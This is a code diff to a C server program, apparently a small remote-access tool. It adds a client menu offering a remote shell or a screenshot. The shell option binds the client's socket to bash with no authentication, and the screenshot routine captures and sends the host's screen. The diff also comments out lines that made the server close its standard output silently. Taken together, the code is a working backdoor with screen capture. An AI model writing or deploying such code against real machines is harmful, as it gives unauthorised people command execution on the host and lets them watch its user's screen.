@@ -9,6 +9,7 @@
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <fcntl.h>
+#include <sys/wait.h>
 
 //NETWORK
 #include<sys/socket.h>
@@ -54,11 +55,57 @@ void screenshot(int socket_client) {
     cairo_surface_destroy(surface);
 }
 
+int get_client_choice(FILE *f){
+	fprintf(f, "Please choose an option:\n1:SHELL\n2:SCREENSHOT\n");
+	fflush(f);
+	int choix = 0;
+	char buffer[255];
+	while(choix == 0){
+		if(fgets(buffer, BUF_SIZE, f) != NULL){
+			int i;
+			for(i = 1; i < 3; i++){
+				if(strchr(buffer, i + '0') != NULL)
+					choix = i;
+			}
+		}
+	}
+	return choix;
+}
+
+void shell(int socket){
+	if(fork() == 0){
+		close(0);
+		dup(socket);
+		close(1);
+		dup(socket);
+		close(2);
+		dup(socket);
+		char* arg[] = {"bash", NULL};
+		execvp(arg[0], arg);
+	} else {
+		wait(NULL);
+	}
+}
+
+void handle_client(int socket){
+	FILE *f = fdopen(socket, "r+");
+	switch(get_client_choice(f)){
+		case 1:
+			printf("He choose shell\n");
+			shell(socket);			
+		break;
+		case 2:
+			printf("He choose screenshot\n");
+			screenshot(socket);			
+		break;
+	}
+}
+
 int main() {
-        close(0);
+    /*    close(0);
         close(1);
         close(2);
-
+*/
 	initialiser_signaux();
 	int socket_serveur = creer_serveur(SERVER_PORT);
 	if(socket_serveur == -1)
@@ -72,7 +119,7 @@ int main() {
                 return 1;
             }
             if(fork() == 0){
-                screenshot(socket_client);
+                handle_client(socket_client);
 
                 close(socket_client);
                 return 1;
